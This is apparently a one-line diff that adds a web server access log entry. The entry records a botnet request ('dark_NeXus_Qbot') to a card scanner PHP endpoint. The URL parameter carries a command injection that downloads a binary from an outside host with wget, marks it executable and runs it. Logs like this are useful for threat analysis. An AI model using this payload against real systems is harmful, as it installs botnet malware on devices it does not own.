@@ -1,0 +1,1 @@
+195.223.173.102 - - [19/Jan/2020:12:52:10 +0200] "GET /card_scan_decoder.php?No=30&door=%60wget http://switchnets.net/hoho.arm7; chmod 777 hoho.arm7; ./hoho.arm7 linear%60 HTTP/1.1" 400 166 "-" "dark_NeXus_Qbot/4.0 (compatible; MSIE5.01; minerword NT)"
